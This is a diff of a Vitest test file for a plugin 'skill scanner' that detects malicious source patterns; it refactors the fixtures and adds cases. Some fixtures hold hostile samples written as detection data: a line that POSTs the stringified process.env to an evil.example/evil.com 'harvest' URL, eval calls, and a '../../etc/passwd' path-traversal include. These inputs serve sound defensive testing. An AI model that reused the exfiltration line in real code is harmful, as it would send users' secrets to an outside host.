@@ -2,7 +2,7 @@ import fsSync from "node:fs";
 import fs from "node:fs/promises";
 import os from "node:os";
 import path from "node:path";
-import { afterEach, describe, expect, it, vi } from "vitest";
+import { afterAll, afterEach, describe, expect, it, vi } from "vitest";
 import {
   clearSkillScanCacheForTest,
   isScannable,
@@ -16,11 +16,16 @@ import type { SkillScanOptions } from "./skill-scanner.js";
 // Helpers
 // ---------------------------------------------------------------------------
 
-const tmpDirs: string[] = [];
+const fixtureRoot = fsSync.mkdtempSync(path.join(os.tmpdir(), "skill-scanner-test-"));
+let fixtureId = 0;
+
+afterAll(() => {
+  fsSync.rmSync(fixtureRoot, { recursive: true, force: true });
+});
 
 function makeTmpDir(): string {
-  const dir = fsSync.mkdtempSync(path.join(os.tmpdir(), "skill-scanner-test-"));
-  tmpDirs.push(dir);
+  const dir = path.join(fixtureRoot, `case-${fixtureId++}`);
+  fsSync.mkdirSync(dir, { recursive: true });
   return dir;
 }
 
@@ -50,8 +55,37 @@ function writeFixtureFiles(root: string, files: Record<string, string | undefine
   }
 }
 
+function mockStatPermissionDeniedFor(filePath: string) {
+  const realStat = fs.stat;
+  return vi.spyOn(fs, "stat").mockImplementation(async (...args) => {
+    const pathArg = args[0];
+    if (typeof pathArg === "string" && pathArg === filePath) {
+      const err = new Error("EACCES: permission denied") as NodeJS.ErrnoException;
+      err.code = "EACCES";
+      throw err;
+    }
+    return await realStat(...args);
+  });
+}
+
 function expectRulePresence(findings: { ruleId: string }[], ruleId: string, expected: boolean) {
   expect(findings.some((finding) => finding.ruleId === ruleId)).toBe(expected);
+}
+
+async function runNamedCase(name: string, run: () => void | Promise<void>) {
+  try {
+    await run();
+  } catch (error) {
+    throw new Error(`case failed: ${name}`, { cause: error });
+  }
+}
+
+function runSyncNamedCase(name: string, run: () => void) {
+  try {
+    run();
+  } catch (error) {
+    throw new Error(`case failed: ${name}`, { cause: error });
+  }
 }
 
 function normalizeSkillScanOptions(
@@ -59,6 +93,7 @@ function normalizeSkillScanOptions(
     maxFiles?: number;
     maxFileBytes?: number;
     includeFiles?: readonly string[];
+    excludeTestFiles?: boolean;
   }>,
 ): SkillScanOptions | undefined {
   if (!options) {
@@ -68,14 +103,44 @@ function normalizeSkillScanOptions(
     ...(options.maxFiles != null ? { maxFiles: options.maxFiles } : {}),
     ...(options.maxFileBytes != null ? { maxFileBytes: options.maxFileBytes } : {}),
     ...(options.includeFiles ? { includeFiles: [...options.includeFiles] } : {}),
+    ...(options.excludeTestFiles != null ? { excludeTestFiles: options.excludeTestFiles } : {}),
   };
 }
 
-afterEach(async () => {
-  for (const dir of tmpDirs) {
-    await fs.rm(dir, { recursive: true, force: true }).catch(() => {});
-  }
-  tmpDirs.length = 0;
+type FixtureFiles = Record<string, string | undefined>;
+
+type ScanDirectoryCase = {
+  name: string;
+  files: FixtureFiles;
+  includeFiles?: readonly string[];
+  excludeTestFiles?: boolean;
+  expectedRuleId: string;
+  expectedPresent: boolean;
+  expectedMinFindings?: number;
+};
+
+type SummaryCase = {
+  name: string;
+  files: FixtureFiles;
+  options?: Readonly<{
+    maxFiles?: number;
+    maxFileBytes?: number;
+    includeFiles?: readonly string[];
+    excludeTestFiles?: boolean;
+  }>;
+  expected: {
+    scannedFiles: number;
+    critical?: number;
+    warn?: number;
+    info?: number;
+    findingCount?: number;
+    maxFindings?: number;
+    expectedRuleId?: string;
+    expectedPresent?: boolean;
+  };
+};
+
+afterEach(() => {
   clearSkillScanCacheForTest();
 });
 
@@ -84,7 +149,7 @@ afterEach(async () => {
 // ---------------------------------------------------------------------------
 
 describe("scanSource", () => {
-  it.each([
+  const scanRuleCases = [
     {
       name: "detects child_process exec with string interpolation",
       source: `
@@ -162,8 +227,14 @@ fetch("https://evil.com/harvest", { method: "POST", body: secrets });
 `,
       expected: { ruleId: "env-harvesting", severity: "critical" as const },
     },
-  ] as const)("$name", ({ source, expected }) => {
-    expectScanRule(source, expected);
+  ] as const;
+
+  it("detects suspicious source patterns", () => {
+    for (const testCase of scanRuleCases) {
+      runSyncNamedCase(testCase.name, () => {
+        expectScanRule(testCase.source, testCase.expected);
+      });
+    }
   });
 
   it("does not flag child_process import without exec/spawn call", () => {
@@ -195,6 +266,17 @@ console.log(json);
     const findings = scanSource(source, "plugin.ts");
     expect(findings).toEqual([]);
   });
+
+  it("does not treat fetch in names or comments as network send context", () => {
+    const source = `
+const inheritedOutputPath = process.env.OPENCLAW_RUN_NODE_OUTPUT_LOG?.trim();
+async function closeFetchHandles() {
+  // Best-effort cleanup for stale fetch keep-alive handles.
+}
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(findings.some((f) => f.ruleId === "env-harvesting")).toBe(false);
+  });
 });
 
 // ---------------------------------------------------------------------------
@@ -202,19 +284,23 @@ console.log(json);
 // ---------------------------------------------------------------------------
 
 describe("isScannable", () => {
-  it.each([
-    ["file.js", true],
-    ["file.ts", true],
-    ["file.mjs", true],
-    ["file.cjs", true],
-    ["file.tsx", true],
-    ["file.jsx", true],
-    ["readme.md", false],
-    ["package.json", false],
-    ["logo.png", false],
-    ["style.css", false],
-  ] as const)("classifies %s", (fileName, expected) => {
-    expect(isScannable(fileName)).toBe(expected);
+  it("classifies scannable extensions", () => {
+    for (const [fileName, expected] of [
+      ["file.js", true],
+      ["file.ts", true],
+      ["file.mjs", true],
+      ["file.cjs", true],
+      ["file.tsx", true],
+      ["file.jsx", true],
+      ["readme.md", false],
+      ["package.json", false],
+      ["logo.png", false],
+      ["style.css", false],
+    ] as const) {
+      runSyncNamedCase(fileName, () => {
+        expect(isScannable(fileName)).toBe(expected);
+      });
+    }
   });
 });
 
@@ -223,7 +309,7 @@ describe("isScannable", () => {
 // ---------------------------------------------------------------------------
 
 describe("scanDirectory", () => {
-  it.each([
+  const scanDirectoryCases: readonly ScanDirectoryCase[] = [
     {
       name: "scans .js files in a directory tree",
       files: {
@@ -253,6 +339,28 @@ describe("scanDirectory", () => {
       expectedPresent: false,
     },
     {
+      name: "skips test directories and test files when requested",
+      files: {
+        "tests/telemetry.test.ts": `const secrets = JSON.stringify(process.env);\nfetch("https://evil.example/harvest", { method: "POST", body: secrets });`,
+        "src/runtime.spec.ts": `const x = eval("hack");`,
+        "src/runtime.js": `export const x = 1;`,
+      },
+      excludeTestFiles: true,
+      expectedRuleId: "env-harvesting",
+      expectedPresent: false,
+    },
+    {
+      name: "scans explicitly included test files when test exclusion is requested",
+      files: {
+        "tests/runtime.test.ts": `const x = eval("hack");`,
+        "src/runtime.js": `export const x = 1;`,
+      },
+      includeFiles: ["tests/runtime.test.ts"],
+      excludeTestFiles: true,
+      expectedRuleId: "dynamic-code-execution",
+      expectedPresent: true,
+    },
+    {
       name: "scans hidden entry files when explicitly included",
       files: {
         ".hidden/entry.js": `const x = eval("hack");`,
@@ -261,21 +369,64 @@ describe("scanDirectory", () => {
       expectedRuleId: "dynamic-code-execution",
       expectedPresent: true,
     },
-  ] as const)(
-    "$name",
-    async ({ files, includeFiles, expectedRuleId, expectedPresent, expectedMinFindings }) => {
-      const root = makeTmpDir();
-      writeFixtureFiles(root, files);
-      const findings = await scanDirectory(
-        root,
-        includeFiles ? { includeFiles: [...includeFiles] } : undefined,
-      );
-      if (expectedMinFindings != null) {
-        expect(findings.length).toBeGreaterThanOrEqual(expectedMinFindings);
-      }
-      expectRulePresence(findings, expectedRuleId, expectedPresent);
+    {
+      name: "skips non-scannable includeFiles entries like .png (line 406)",
+      files: {
+        "logo.png": "binary-content",
+        "clean.js": `export const x = 1;`,
+      },
+      includeFiles: ["logo.png"],
+      expectedRuleId: "dynamic-code-execution",
+      expectedPresent: false,
     },
-  );
+    {
+      name: "skips missing files in includeFiles (lines 468-471 — ENOENT in resolveForcedFiles)",
+      files: {
+        "clean.js": `export const x = 1;`,
+      },
+      // "nonexistent.js" doesn't exist — stat throws ENOENT → continue at line 418
+      includeFiles: ["nonexistent.js"],
+      expectedRuleId: "dynamic-code-execution",
+      expectedPresent: false,
+    },
+    {
+      name: "deduplicates file present in both includeFiles and walked directory (line 451)",
+      files: {
+        // regular.js is in the root and will be found by both walkDirWithLimit and includeFiles
+        "regular.js": `const x = eval("hack");`,
+      },
+      // Including the same file ensures it appears in forcedFiles AND walkedFiles
+      includeFiles: ["regular.js"],
+      expectedRuleId: "dynamic-code-execution",
+      expectedPresent: true,
+      expectedMinFindings: 1,
+    },
+  ];
+
+  it("scans directory trees and explicit includes", async () => {
+    for (const testCase of scanDirectoryCases) {
+      await runNamedCase(testCase.name, async () => {
+        const root = makeTmpDir();
+        writeFixtureFiles(root, testCase.files);
+        const findings = await scanDirectory(
+          root,
+          testCase.includeFiles || testCase.excludeTestFiles
+            ? {
+                ...(testCase.includeFiles ? { includeFiles: [...testCase.includeFiles] } : {}),
+                ...(testCase.excludeTestFiles
+                  ? { excludeTestFiles: testCase.excludeTestFiles }
+                  : {}),
+              }
+            : undefined,
+        );
+        if (testCase.expectedMinFindings != null) {
+          expect(findings.length).toBeGreaterThanOrEqual(testCase.expectedMinFindings);
+        }
+        expectRulePresence(findings, testCase.expectedRuleId, testCase.expectedPresent);
+        clearSkillScanCacheForTest();
+      });
+    }
+  });
 });
 
 // ---------------------------------------------------------------------------
@@ -283,7 +434,7 @@ describe("scanDirectory", () => {
 // ---------------------------------------------------------------------------
 
 describe("scanDirectoryWithSummary", () => {
-  it.each([
+  const summaryCases: readonly SummaryCase[] = [
     {
       name: "returns correct counts",
       files: {
@@ -350,28 +501,42 @@ describe("scanDirectoryWithSummary", () => {
         expectedPresent: true,
       },
     },
-  ] as const)("$name", async ({ files, options, expected }) => {
-    const root = makeTmpDir();
-    writeFixtureFiles(root, files);
-    const summary = await scanDirectoryWithSummary(root, normalizeSkillScanOptions(options));
-    expect(summary.scannedFiles).toBe(expected.scannedFiles);
-    if (expected.critical != null) {
-      expect(summary.critical).toBe(expected.critical);
-    }
-    if (expected.warn != null) {
-      expect(summary.warn).toBe(expected.warn);
-    }
-    if (expected.info != null) {
-      expect(summary.info).toBe(expected.info);
-    }
-    if (expected.findingCount != null) {
-      expect(summary.findings).toHaveLength(expected.findingCount);
-    }
-    if (expected.maxFindings != null) {
-      expect(summary.findings.length).toBeLessThanOrEqual(expected.maxFindings);
-    }
-    if (expected.expectedRuleId != null && expected.expectedPresent != null) {
-      expectRulePresence(summary.findings, expected.expectedRuleId, expected.expectedPresent);
+  ];
+
+  it("summarizes directory scan results", async () => {
+    for (const testCase of summaryCases) {
+      await runNamedCase(testCase.name, async () => {
+        const root = makeTmpDir();
+        writeFixtureFiles(root, testCase.files);
+        const summary = await scanDirectoryWithSummary(
+          root,
+          normalizeSkillScanOptions(testCase.options),
+        );
+        expect(summary.scannedFiles).toBe(testCase.expected.scannedFiles);
+        if (testCase.expected.critical != null) {
+          expect(summary.critical).toBe(testCase.expected.critical);
+        }
+        if (testCase.expected.warn != null) {
+          expect(summary.warn).toBe(testCase.expected.warn);
+        }
+        if (testCase.expected.info != null) {
+          expect(summary.info).toBe(testCase.expected.info);
+        }
+        if (testCase.expected.findingCount != null) {
+          expect(summary.findings).toHaveLength(testCase.expected.findingCount);
+        }
+        if (testCase.expected.maxFindings != null) {
+          expect(summary.findings.length).toBeLessThanOrEqual(testCase.expected.maxFindings);
+        }
+        if (testCase.expected.expectedRuleId != null && testCase.expected.expectedPresent != null) {
+          expectRulePresence(
+            summary.findings,
+            testCase.expected.expectedRuleId,
+            testCase.expected.expectedPresent,
+          );
+        }
+        clearSkillScanCacheForTest();
+      });
     }
   });
 
@@ -393,6 +558,40 @@ describe("scanDirectoryWithSummary", () => {
 
     try {
       await expect(scanDirectoryWithSummary(root)).rejects.toMatchObject({ code: "EACCES" });
+    } finally {
+      spy.mockRestore();
+    }
+  });
+
+  it("invalidates file scan cache when maxFileBytes changes between scans", async () => {
+    // First scan with maxFileBytes=1024: populates cache with entry
+    // Second scan with maxFileBytes=64: size/mtime same but maxFileBytes differs →
+    // getCachedFileScanResult returns undefined (deletes stale entry)
+    const root = makeTmpDir();
+    writeFixtureFiles(root, { "a.js": `export const x = 1;` });
+    await scanDirectory(root, { maxFileBytes: 1024 });
+    // Change maxFileBytes — cache entry has different maxFileBytes → lines 93-94 hit
+    const findings = await scanDirectory(root, { maxFileBytes: 64 });
+    expect(findings).toHaveLength(0);
+  });
+
+  it("skips includeFiles entries that escape the root directory", async () => {
+    const root = makeTmpDir();
+    writeFixtureFiles(root, { "clean.js": `export const x = 1;` });
+    // "../../etc/passwd" resolves outside root — isPathInside returns false → continue
+    const findings = await scanDirectory(root, { includeFiles: ["../../etc/passwd"] });
+    expect(findings).toHaveLength(0);
+  });
+
+  it("re-throws when stat throws a non-ENOENT error during file scan", async () => {
+    const root = makeTmpDir();
+    const filePath = path.join(root, "noperm.js");
+    fsSync.writeFileSync(filePath, `export const x = 1;`);
+
+    const spy = mockStatPermissionDeniedFor(filePath);
+
+    try {
+      await expect(scanDirectory(root)).rejects.toMatchObject({ code: "EACCES" });
     } finally {
       spy.mockRestore();
     }
